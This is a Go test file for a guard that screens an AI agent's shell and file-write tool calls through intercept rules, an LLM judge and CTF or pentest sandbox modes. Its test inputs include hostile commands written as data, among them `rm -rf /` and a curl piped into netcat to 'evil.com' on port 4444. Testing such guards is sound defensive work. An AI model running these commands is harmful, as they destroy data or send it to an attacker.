package guard

import (
	"context"
	"encoding/json"
	"testing"

	"p3y/db"
	"p3y/intercept"
	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

func TestGuardCTFModeFilteringAndFallbackSkip(t *testing.T) {
	dsn, _, err := db.DSN()
	if err != nil {
		t.Skip("no test database configured")
	}
	d, err := db.Open(dsn)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = d.Close() })

	ic := intercept.New(d)
	priorConfig := ic.GetJudgeConfig()
	t.Cleanup(func() { _ = ic.SetJudgeConfig(priorConfig); ic.SetReviewer(nil) })

	if err := ic.SetJudgeConfig(intercept.JudgeConfig{Enabled: true, FailAction: "deny"}); err != nil {
		t.Fatal(err)
	}
	judgeCalls := 0
	ic.SetReviewer(func(context.Context, int64, string, intercept.ReviewInput) (intercept.Decision, error) {
		judgeCalls++
		return intercept.Decision{Action: "deny", Message: "should not run in ctf"}, nil
	})

	// Insert a temporary user-defined rule to verify custom rules still apply in CTF mode.
	var customID int64
	err = d.QueryRow(`INSERT INTO intercept_rules(name, enabled, priority, match_target, match_type, pattern, action, message)
		VALUES ('test-ctf-custom-rule', true, 120, 'tool_input', 'string', 'CUSTOM_BLOCK_TOKEN', 'deny', 'custom deny') RETURNING id`).Scan(&customID)
	if err != nil {
		t.Fatal(err)
	}
	ic.Invalidate()
	t.Cleanup(func() {
		_, _ = d.Exec(`DELETE FROM intercept_rules WHERE id=$1`, customID)
		ic.Invalidate()
	})

	g := NewWithInterceptor(ic)
	ctfCtx := intercept.WithSandboxMode(context.Background(), "ctf")
	pentestCtx := intercept.WithSandboxMode(context.Background(), "pentest")

	// 1. Write in CTF mode passes even with /delete or reboot keywords.
	writeInput, _ := json.Marshal(map[string]string{"file_path": "/work/q.py", "content": "reboot = True\nurl = '/delete'"})
	if b, msg, _ := g.Hooks().PreToolUse(ctfCtx, "Write", writeInput); b {
		t.Fatalf("ctf Write should bypass intercept, got blocked: %s", msg)
	}
	// Pentest Write with /delete still hits built-in delete path rule.
	if b, _, _ := g.Hooks().PreToolUse(pentestCtx, "Write", writeInput); !b {
		t.Fatal("pentest Write should still be checked by intercept rules")
	}

	// 2. Bash in CTF mode allows rm -rf /tmp/foo and dd if=bzImage, and skips LLM judge.
	for _, cmd := range []string{
		`cd /tmp && rm -rf /tmp/foo && mkdir /tmp/foo`,
		`cd /work/k66 && dd if=bzImage bs=1 skip=16057 | gzip -dc > out/vmlinux`,
	} {
		in, _ := json.Marshal(map[string]string{"command": cmd})
		if b, msg, _ := g.Hooks().PreToolUse(ctfCtx, "Bash", in); b {
			t.Fatalf("ctf Bash %q should be allowed, got blocked: %s", cmd, msg)
		}
	}
	if judgeCalls != 0 {
		t.Fatalf("expected LLM judge to be skipped in ctf mode, got %d calls", judgeCalls)
	}

	// 3. CTF mode still blocks root wipe and user-defined rules.
	for _, cmd := range []string{
		`rm -rf /`,
		`echo CUSTOM_BLOCK_TOKEN`,
	} {
		in, _ := json.Marshal(map[string]string{"command": cmd})
		if b, _, _ := g.Hooks().PreToolUse(ctfCtx, "Bash", in); !b {
			t.Fatalf("ctf Bash %q should still be blocked", cmd)
		}
	}

	// 4. Non-CTF mode still invokes LLM judge when unmatched.
	unmatched, _ := json.Marshal(map[string]string{"command": "ls -la /work"})
	if b, _, _ := g.Hooks().PreToolUse(pentestCtx, "Bash", unmatched); !b || judgeCalls != 1 {
		t.Fatalf("expected pentest unmatched Bash to call LLM judge once and deny, got blocked=%v judgeCalls=%d", b, judgeCalls)
	}
}

var _ = hook.PreToolUse
